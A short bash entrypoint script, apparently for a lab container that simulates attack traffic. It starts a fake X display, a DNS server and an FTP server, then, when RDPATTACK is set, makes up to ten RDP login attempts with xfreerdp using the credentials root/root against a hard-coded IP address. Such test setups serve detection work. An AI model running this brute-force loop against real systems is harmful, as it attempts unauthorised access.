#!/bin/bash

# Environment variables:
# DONOTHING
# SMBATTACK
# RDPATTACK

# Setup fake "GUI" to perform RDP connections
export DISPLAY=:0
Xvfb :0 -screen 0 1024x768x16 2>/dev/null 1>&2 &

# Start DNS server
named &

# Start ProFTPd service
proftpd &

if [ "${DONOTHING}" = true ]; then
	while [ 1 ]; do
		sleep 10
	done
else

# Start RDP bruteforce on agent w/externally accessible interface 
	if [ "${RDPATTACK}" = true ]; then
		# Wait 10 seconds to start
		sleep 10

		# Stop trying to RDP after counter
		let counter=1
		while [ 1 ]; do
			timeout 3s bash -c "yes | xfreerdp /u:root /p:root /v:153.17.52.101"
			echo $counter
			let counter=$counter+1
			if [ $counter -ge 10 ]; then
				break
			fi
		done
	fi
fi

# After you finish scripted tasks, just exist
while [ 1 ]; do
	sleep 10
done